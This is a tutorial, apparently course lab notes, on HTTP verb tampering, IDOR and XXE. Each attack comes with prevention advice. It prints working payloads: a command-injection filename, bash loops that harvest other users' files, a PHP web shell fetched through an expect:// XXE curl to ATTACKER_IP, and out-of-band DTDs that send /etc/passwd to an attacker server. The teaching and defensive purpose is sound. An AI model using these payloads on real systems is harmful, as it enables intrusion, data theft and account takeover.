# Web Attacks

Three attack classes covered here, all common in any web application:

* **HTTP Verb Tampering:** Unexpected HTTP methods bypass authorization or other security controls.
* **IDOR:** Direct object references combined with weak access control expose other users' data.
* **XXE:** Outdated XML libraries parsing user XML can lead to local file disclosure, source code disclosure, credential theft, and RCE.

Detect, exploit, and prevent each.

## Intro to HTTP Verb Tampering

Development teams often think in GET and POST, but any client can send any of HTTP's 9 verbs. If both the application and server only accept GET and POST, other verbs just error out at worst. If the server accepts more methods than the application was coded to handle, verb tampering can provide access to restricted functionality or bypass security controls.

The verbs that matter beyond GET and POST:

* **HEAD:** GET without the response body
* **PUT:** Write a payload to a location
* **DELETE:** Delete a resource
* **OPTIONS:** List accepted verbs
* **PATCH:** Partially modify a resource

PUT and DELETE against the webroot are obviously sensitive. The vulnerability originates from a misconfiguration in either the web server or the application code.

### Insecure Configurations

Authorization limited to specific methods leaves others open:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

HEAD, or anything unlisted, skips authentication entirely.

### Insecure Coding

Filters that do not cover all HTTP methods can also be vulnerable:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

The filter checks `$_GET`, but the query uses `$_REQUEST` (GET + POST). Send the injection via POST: GET parameters are empty, the filter passes, and SQL injection reaches the query through the verb inconsistency.

This coding issue is far more common in the wild than the configuration issue.

## Bypassing Basic Authentication

Configuration-type verb tampering can bypass HTTP Basic Authentication. Try alternate methods and observe their handling. Scanners reliably catch configuration-type issues; coding-type issues need active filter-bypass testing.

### Identify

A File Manager application's Reset button reaches `/admin/reset.php` and prompts for Basic Authentication. Without credentials, it returns 401. Visiting `/admin` directly also prompts, so the full directory is restricted.

### Exploit

Intercept the reset request. It is a GET request.

Change the request method to POST. If it still returns 401, authentication covers GET and POST. Check what else the server accepts:

```bash
curl -i -X OPTIONS http://<SERVER_IP>:<PORT>/
# Allow: POST,OPTIONS,HEAD,GET
```

HEAD is accepted by default on many servers. Change the request to HEAD: there is no login prompt, no 401, and an empty body as expected—but the reset function still executes and files are removed.

No output is needed when the action itself is the goal.

## Bypassing Security Filters

Coding-type verb tampering can bypass back-end injection filters.

The pattern is a filter inspecting only `$_POST['param']`, or only `$_GET`, while the underlying functionality reads the other method.

### Identify

Creating a file named `test;` returns:

```
Malicious Request Denied!
```

A filter exists and blocks injection attempts in the normal flow.

### Exploit

Intercept the request and change its request method. The denial message disappears and the file is created, indicating that the filter missed the alternate verb.

Confirm with command injection using the filename:

```
file1; touch file2;
```

Under the swapped method, both files appear. The application was otherwise protected against command injection; verb tampering bypassed that protection.

## Verb Tampering Prevention

### Insecure Configuration

Never scope authorization to specific verbs.

Apache example in `000-default.conf` or `.htaccess`:

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

`<Limit GET>` protects only GET. POST, HEAD, and OPTIONS can bypass it.

Tomcat `web.xml` has the same issue through `<http-method>GET</http-method>` inside `security-constraint`. ASP.NET `web.config` can have the same issue through `allow verbs="GET"` or `deny verbs="GET"`.

Fix by allowing or denying all methods. If enumeration is necessary, use inverse keywords that cover everything except the listed verb:

| Platform | Safer inverse method   |
| -------- | ---------------------- |
| Apache   | `LimitExcept`          |
| Tomcat   | `http-method-omission` |
| ASP.NET  | `add` / `remove`       |

Also disable HEAD server-wide unless it is actually needed.

### Insecure Coding

Find inconsistencies between the method a filter checks and the method the functionality uses.

The File Manager flaw:

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

In isolation, the filter appears to prevent command injection. However, it reads `$_POST` while the command reads `$_REQUEST`.

In production, these lines usually live in separate functions, allowing the issue to survive code review.

Fix by keeping HTTP method usage consistent for each functionality and making security filters inspect all request parameters:

* PHP: `$_REQUEST['param']`
* Java: `request.getParameter('param')`
* C#: `Request['param']`

## Intro to IDOR

IDOR occurs when an application exposes a direct reference to an object, such as a file or database row, that the user can control, while the back end lacks access control to prevent retrieval of objects that do not belong to that user.

For example:

```
download.php?file_id=123
```

Try:

```
download.php?file_id=124
```

Guessable IDs make this mass-exploitable.

The exposed reference alone is not the vulnerability. The missing back-end access control is. Many applications only control access by hiding links in the front end, but manipulated HTTP requests bypass this completely.

Building solid access control, such as RBAC, is difficult. Automating its testing is difficult. As a result, IDOR vulnerabilities survive into production even at Facebook, Instagram, and Twitter scale.

### Impact Ladder

1. **Information Disclosure:** Read other users' personal files or credit card data.
2. Modify or delete other users' data, including account takeover through email changes and password resets.
3. **Insecure Function Calls:** Call admin-only APIs as a standard user to change passwords or grant roles.
4. Full application takeover.

## Identifying IDORs

### URL Parameters and APIs

Study every request returning a file or resource for object references:

```
?uid=1
?filename=file_1.pdf
```

References can occur in URL parameters, APIs, or headers such as cookies.

Increment values:

```
?uid=2
```

Or fuzz thousands of variations. Any response containing data that is not yours is an IDOR.

### AJAX Calls

JavaScript-framework applications may ship all function calls to the front end and only disable functionality that a role should not use.

Read the JavaScript for admin or unused endpoints:

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The function may never be called as a non-admin user, but it remains callable once found.

The same applies to available back-end source code in open-source applications.

### Understand Hashing and Encoding

References may be encoded or hashed.

Base64 is recognizable from its character set:

```
?filename=ZmlsZV8xMjMucGRm
```

It decodes to:

```
file_123.pdf
```

Re-encode `file_124.pdf` and request it.

Hashed references can look secure:

```
?filename=c81e728d...
```

However, if the front end computes the hash, the recipe is visible:

```javascript
data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
```

Otherwise, identify the hash algorithm with hash-identifier tools and test candidate inputs until one matches.

### Compare User Roles

Register two users and compare their requests and references.

If User1's API call:

```
/services/data/salaries/users/1
```

can be replayed unchanged under User2's session, the back end only verifies that the requester is logged in—not that they own the requested object.

Even if you cannot compute other users' parameters, this confirms an access-control flaw worth investigating.

## Mass IDOR Enumeration

### Insecure Parameters

An Employee Manager example:

```
/documents.php?uid=1
```

It lists a user's documents with a predictable static file pattern:

```
/documents/Invoice_1_09_2021.pdf
```

This includes the UID plus month and year. It is a basic static-file IDOR and can be fuzzed, though it assumes known filename prefixes.

A stronger issue occurs when the page accepts `uid` as a GET parameter and trusts it. Change the request to:

```
?uid=2
```

The rendered page may look identical. Inspect linked files rather than only the layout:

```
/documents/Invoice_2_08_2020.pdf
```

This is employee 2's data.

Always compare source code and page size, not just the rendered output.

The same issue applies to filter parameters such as:

```
uid_filter=1
```

These may be changed or removed to dump all records.

### Mass Enumeration

Grab a unique HTML marker for links and use `grep`:

```bash
curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Regex is better than trimming commands.

Full harvest:

```bash
#!/bin/bash

url="http://<SERVER_IP>:<PORT>"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Burp Intruder and ZAP Fuzzer can accomplish the same task, but the Bash loop is usually fastest to write.

## Bypassing Encoded References

A Contracts page downloads through a POST request to `/download.php`:

```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

This looks like an MD5 hash. Download scripts like this avoid direct file links.

Because it is a one-way function, hash likely inputs and compare the result:

```bash
echo -n 1 | md5sum
```

If UID, username, and filename guesses all fail, it may be a Secure Direct Object Reference—unless the hash is computed client-side.

### Function Disclosure

JavaScript frameworks often perform sensitive work in the front end.

The link calls:

```javascript
javascript:downloadContract('1')
```

The function is:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

The recipe is:

```
md5(base64(uid))
```

Verify it:

```bash
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b — matches
```

`-n` on `echo` and `-w 0` on `base64` remove newlines. Hashing a trailing newline produces a different result.

Reversing the recipe turns the secure reference back into an IDOR.

### Mass Enumeration

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<SERVER_IP>:<PORT>/download.php
    done
done
```

`-OJ` saves each file using its `Content-Disposition` filename, such as:

```
contract_<hash>.pdf
```

## IDOR in Insecure APIs

IDOR Insecure Function Calls involve executing functions or APIs as another user, such as changing their information, resetting their password, or buying using their payment data.

These are frequently chained with an information-disclosure IDOR that provides needed values.

### Identifying

Edit Profile sends a PUT request to:

```
/profile/api.php/profile/1
```

PUT updates, POST creates, DELETE removes, and GET reads.

The request body:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

There are hidden parameters beyond form fields: `uid`, `uuid`, and `role`.

The role also appears in the request header:

```
Cookie: role=employee
```

Privileges passed in a client-controlled request are a classic flaw. Manipulate them unless the back end verifies them.

### Exploiting

Four angles:

1. Change your own UID for account takeover.
2. Change another user's details.
3. Create or delete users.
4. Change your own role.

Results in this example:

* Send `"uid": 2` to endpoint `/1`: `uid mismatch`.
* Use endpoint `/2` with `"uid": 2`: `uuid mismatch`.
* POST to create: `Creating new employees is for admins only`.
* DELETE: same result.
* Set role to `admin`: `Invalid role`.

The function-call paths appear blocked, but the API's GET request has not been tested.

When write paths fail, test the read path for disclosure that unlocks them.

## Chaining IDOR Vulnerabilities

The page loads user details through a GET request to the same endpoint. The only authorization in the request is the `role=employee` cookie. There is no JWT or other user-specific value.

Even with a token, disclosure remains possible unless the token is actively compared to the requested object.

### Information Disclosure

GET:

```
/profile/api.php/profile/2
```

returns user 2's full profile:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

The previously uncalculable UUID is now available.

### Modifying Other Users' Details

Send a PUT request to:

```
/profile/api.php/profile/2
```

Include UID 2, the target's real UUID, and modifications. There are no mismatch errors and the changes persist.

Escalation options include:

* Change the target's email and request a password reset. The reset link arrives in your inbox, enabling account takeover.
* Insert an XSS payload into `about`, which executes when they view their profile page.

### Chaining Both Vulnerabilities

Enumerate all users through the GET disclosure and identify the admin:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

The real role name is now known.

Update your own profile using:

```json
"role": "web_admin"
```

There is no `Invalid role` response and no access-control error. The role persists.

Refresh the page, or manually set:

```
Cookie: role=web_admin
```

Then POST to create a new user. It succeeds.

The disclosure IDOR fed the function-call IDOR past every check.

With the admin role, mass assignment across all users follows: XSS in every profile, or rewriting every user's email by retrieving each UUID and updating each account.

## IDOR Prevention

### Object-Level Access Control

Map RBAC to every object and resource. Test each request's role and privileges against the target object before allowing access:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

The role must come from back-end RBAC through the session token—never from the request body or a cookie, both of which are user-controlled.

### Object Referencing

Direct references are acceptable only when strong access control exists.

Even then, avoid cleartext or simple patterns such as:

```
uid=1
```

Use salted hashes or UUIDs, such as UUID V4:

```
89c9b29b-d19f-4515-b2dd-abb6e693eb20
```

Map them to objects in the database.

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Never compute hashes in the front end. Generate them during object creation, store them server-side, and maintain database maps for cross-referencing.

UUIDs make IDOR harder to test, which is why object referencing is step two after access control. Broken access control still falls to session-replay techniques regardless of reference strength.

## Intro to XXE

XXE occurs when user-controlled XML is parsed unsafely by outdated libraries. XML features can become malicious, leading to file disclosure, source disclosure, server shutdown, and more.

### XML Refresher

Relevant XML concepts:

* Tags: `<date>`
* Entities: XML variables, such as `&lt;`
* Elements: A root plus child tags, with values between start and end tags
* Attributes: Values inside tags, such as `version="1.0"`
* Declaration line

Reserved characters `<`, `>`, `&`, and `"` require entity references.

DTDs validate structure and can be declared inline or externally:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

Custom entities in the DTD:

```xml
<!ENTITY company "Inlane Freight">
```

Reference them with:

```xml
&company;
```

The parser substitutes the value at parse time.

The attack primitive is an external entity through SYSTEM. PUBLIC works too in most cases:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

Server-side parsing in SOAP APIs or web forms, combined with `&signature;`, causes the parser to read a back-end file into the entity. The response may then display it.

## Local File Disclosure

### Identifying

Find pages that accept XML input.

A contact form POSTs XML to:

```
/submitDetails.php
```

The response echoes the `email` element value:

```
Check your email X for further instructions
```

Note which elements are displayed because they are injection sinks.

Test entity support first:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Place `&company;` in the email element. If the response prints `Inlane Freight`, XML injection works. A patched application would print raw `&company;`.

If the request already includes a DOCTYPE, add the ENTITY declaration to it.

Applications that default to JSON may still accept XML. Change the Content-Type to:

```
application/xml
```

Convert the body and test.

### Reading Sensitive Files

Use SYSTEM:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

If `/etc/passwd` appears in the response, file disclosure is confirmed.

Configuration files containing passwords and `id_rsa` keys can turn file disclosure into server access. Java applications may accept directory paths and return listings, which can help locate secrets.

### Reading Source Code

Attempting to read PHP source directly:

```
file:///var/www/html/index.php
```

may return nothing because PHP source contains XML-special characters such as `<`, `>`, and `&`, which break the entity. Binary content can also break it.

For PHP, use a base64 filter wrapper:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Decode the returned value. Burp's Inspector can decode it in place.

This is PHP-specific. The next section covers a universal approach.

### RCE with XXE

Escalation order:

* Search for SSH keys.
* Steal Windows hashes through calls to your server.
* Use the PHP `expect://` wrapper if the expect module is enabled.

For direct output:

```
expect://id
```

This prints command output. Complex commands such as reverse shells often break XML syntax.

A more efficient approach is to fetch a web shell.

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

`$IFS` replaces spaces. Characters such as `|`, `>`, and `{` also often break XML syntax, so avoid them.

The expect module is rarely enabled in modern PHP. XXE therefore usually remains a disclosure primitive that feeds further access.

### Other Attacks

XXE can enable SSRF to enumerate internal ports and pages.

It can also cause DoS through self-referential entity expansion:

```
a0="DOS", a1="&a0;"×10, ... up to a10
```

This exhausts memory. Modern servers such as Apache block entity loops, but the technique remains useful to understand.

## Advanced File Disclosure

### CDATA Exfiltration

CDATA enables universal source and binary reading by wrapping file contents in:

```xml
<![CDATA[ ... ]]>
```

The parser then treats special characters as raw text.

A naive attempt fails because XML does not join internal and external entities:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Bypass this with parameter entities, which begin with `%`, are DTD-only, and are referenced from an external source. Joined entities then count as external:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Host this as `xxe.dtd`:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Use the following request:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

This returns source code without base64, making it faster to search files for secrets.

Some modern servers may still refuse specific files, such as `index.php`, because of entity or file self-reference loop protection.

### Error-Based XXE

Use error-based XXE when no entity is displayed but the application displays runtime errors.

First confirm error reflection using malformed XML, an unclosed tag, or a non-existent entity reference.

Host a DTD that embeds file content into an error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The undefined entity forces an error containing the joined `%file;` content.

Trigger it:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %error;
]>
```

This can target source code too by changing the file path, but it is less reliable because error-message length limits and special characters may break it.

## Blind Data Exfiltration

Fully blind XXE provides no output and no errors.

### Out-of-Band Exfiltration

Make the server send data over HTTP, similar to blind SQL injection, command injection, or XSS.

Host a DTD where file content, base64-encoded through a PHP filter, is included in a URL:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

The parser resolves `%file;` and requests:

```
http://<ATTACKER_IP>:8000/?content=WFhFX1NBTVBMRV9EQVRB
```

Decode the received content.

Automatically decode server-side:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
vi index.php   # the code above
php -S 0.0.0.0:8000
```

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The `<root>&content;</root>` reference triggers the request.

The PHP development server log shows the request and prints decoded `/etc/passwd`.

A DNS OOB exfiltration variant uses encoded data as a subdomain:

```
ENCODEDTEXT.our.website.com
```

Capture it using `tcpdump`. This requires more setup but can be the only available outbound channel.

### Automated OOB

XXEinjector supports basic XXE, CDATA, error-based XXE, and blind OOB exfiltration:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy the Burp request into a file, keep only the XML first line, and mark the injection position with `XXEINJECT`:

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
...SNIP...

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

The data does not print because it is base64 encoded. Exfiltrated files are stored in:

```
Logs/<ip>/<path>
```

For example:

```bash
cat Logs/10.129.201.94/etc/passwd.log
```

## XXE Prevention

XXE is easier to prevent than many web vulnerabilities because the root cause is usually outdated libraries rather than developer-written code.

### Avoid Outdated Components

XML parsing is handled by libraries, not handwritten parsers. Update them.

PHP's `libxml_disable_entity_loader` is deprecated since PHP 8.0 because it enabled unsafe external entities. Editors such as VSCode flag it.

OWASP's XXE Prevention Cheat Sheet catalogs vulnerable libraries and safe replacements.

Also update everything else that parses XML:

* SOAP API libraries
* SVG processors
* PDF processors
* Other outdated components, including Node modules

### Safe XML Configurations

In addition to updated libraries:

* Disable custom DTD references.
* Disable external XML entities.
* Disable Parameter Entity processing.
* Disable XInclude support.
* Disable entity reference loops.
* Handle exceptions properly.
* Do not display runtime errors.

These are workarounds and defense-in-depth measures, not substitutes for fixed libraries.

Where possible, replace XML with JSON or YAML. Avoid XML-based API standards such as SOAP in favor of JSON APIs such as REST.

A WAF adds another layer, but never rely on it alone. WAFs can be bypassed.
